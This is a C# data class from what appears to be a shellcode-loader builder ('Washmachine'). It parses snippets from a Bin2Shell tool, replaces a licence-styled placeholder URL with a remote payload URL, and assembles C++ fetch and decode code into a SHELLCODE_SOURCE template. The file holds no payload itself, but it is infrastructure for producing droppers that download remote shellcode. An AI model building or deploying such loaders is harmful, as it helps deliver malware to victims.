namespace Washmachine.Models;

/// <summary>
/// Parsed YAML output from Bin2Shell in web mode.
/// Each field corresponds to a top-level key in the YAML snippet file.
/// </summary>
public sealed class Bin2ShellWebOutput
{
    public string CppIncludes { get; set; } = string.Empty;
    public string CppDeclarations { get; set; } = string.Empty;
    public string CppWebFetch { get; set; } = string.Empty;
    public string CppPayloadInit { get; set; } = string.Empty;
    public string CppDecode { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public int PayloadLen { get; set; }
    public string PayloadChecksum { get; set; } = string.Empty;

    /// <summary>
    /// Replaces the placeholder URL in all C++ code fields with the user's actual URL.
    /// </summary>
    public void ReplacePayloadUrl(string actualUrl)
    {
        var trimmedUrl = actualUrl?.Trim() ?? string.Empty;
        if (string.IsNullOrWhiteSpace(trimmedUrl))
            return;

        const string placeholder = "http://localhost/licence";

        CppIncludes = ReplaceIn(CppIncludes, placeholder, trimmedUrl);
        CppDeclarations = ReplaceIn(CppDeclarations, placeholder, trimmedUrl);
        CppWebFetch = ReplaceIn(CppWebFetch, placeholder, trimmedUrl);
        CppPayloadInit = ReplaceIn(CppPayloadInit, placeholder, trimmedUrl);
        CppDecode = ReplaceIn(CppDecode, placeholder, trimmedUrl);
    }

    private static string ReplaceIn(string source, string oldValue, string newValue)
    {
        if (string.IsNullOrEmpty(source))
            return source;
        return source.Replace(oldValue, newValue);
    }

    /// <summary>
    /// Assembles all C++ code sections into a single block suitable for injection
    /// into the SHELLCODE_SOURCE placeholder.
    /// </summary>
    public string BuildShellcodeSourceBlock()
    {
        var parts = new List<string>();

        if (!string.IsNullOrWhiteSpace(CppIncludes))
            parts.Add(CppIncludes.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppDeclarations))
            parts.Add(CppDeclarations.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppWebFetch))
            parts.Add(CppWebFetch.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppPayloadInit))
            parts.Add(CppPayloadInit.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppDecode))
            parts.Add(CppDecode.TrimEnd());

        return string.Join(Environment.NewLine + Environment.NewLine, parts);
    }

    /// <summary>
    /// Returns the file-scope preamble: #include directives and the web-fetch
    /// helper function definition. These MUST appear before main().
    /// </summary>
    public string BuildPreamble()
    {
        var parts = new List<string>();

        if (!string.IsNullOrWhiteSpace(CppIncludes))
            parts.Add(CppIncludes.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppWebFetch))
            parts.Add(CppWebFetch.TrimEnd());

        return string.Join(Environment.NewLine + Environment.NewLine, parts);
    }

    /// <summary>
    /// Returns the main()-scope body: variable declarations, payload init,
    /// and decode logic that belong inside the function body.
    /// </summary>
    public string BuildBody()
    {
        var parts = new List<string>();

        if (!string.IsNullOrWhiteSpace(CppDeclarations))
            parts.Add(CppDeclarations.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppPayloadInit))
            parts.Add(CppPayloadInit.TrimEnd());
        if (!string.IsNullOrWhiteSpace(CppDecode))
            parts.Add(CppDecode.TrimEnd());

        return string.Join(Environment.NewLine + Environment.NewLine, parts);
    }
}
